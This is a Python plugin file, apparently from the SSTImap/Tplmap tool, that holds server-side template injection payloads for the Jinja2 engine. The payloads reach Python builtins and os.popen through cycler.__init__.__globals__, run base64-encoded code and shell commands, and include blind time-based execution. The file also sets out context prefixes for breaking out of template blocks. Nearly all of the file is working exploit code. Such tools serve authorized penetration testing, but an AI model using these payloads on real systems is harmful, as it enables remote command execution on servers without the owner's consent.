from plugins.languages import python
from utils import rand


class Jinja2(python.Python):
    priority = 5
    plugin_info = {
        "Description": """Jinja template engine""",
        "Authors": [
            "@bUst4gr0 https://github.com/bUst4gr0",  # New SSTImap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Improvements for new SSTImap payload
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Jeremy Bae @opt9 https://github.com/opt9",  # Contributions to the Tplmap payload
        ],
        "Engine": [
            "Homepage: https://jinja.palletsprojects.com/en/stable/",
            "Github: https://github.com/pallets/jinja",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
            },
            'render_error': {
                'render': '{code}',
                'header': '{{{{ cycler.__init__.__globals__.__builtins__.getattr("", (({header[0]}+{header[1]})|string)+(',
                'trailer': '|string)+(({trailer[0]}+{trailer[1]})|string))}}}}',
                'test_render': f'({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e',
                'test_render_expected': f'{(rand.randints[0], rand.randints[1] * rand.randints[2])}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{{{cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())}}}}"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{{{cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"|base64 -d)').read()}}}}"""
            },
            'evaluate_error': {
                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
            },
            'execute_error': {
                'execute': """cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"|base64 -d)').read().rstrip()"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"| base64 -d) && sleep {delay}')}}}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # This covers {{%s}}
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '', 'closures': python.ctx_closures},
            # This covers {% %s %}
            {'level': 1, 'prefix': '{closure}%}}', 'suffix': '', 'closures': python.ctx_closures},
            # If and for blocks
            # # if %s:\n# endif
            # # for a in %s:\n# endfor
            {'level': 5, 'prefix': '{closure}\n', 'suffix': '\n', 'closures': python.ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},

        ])
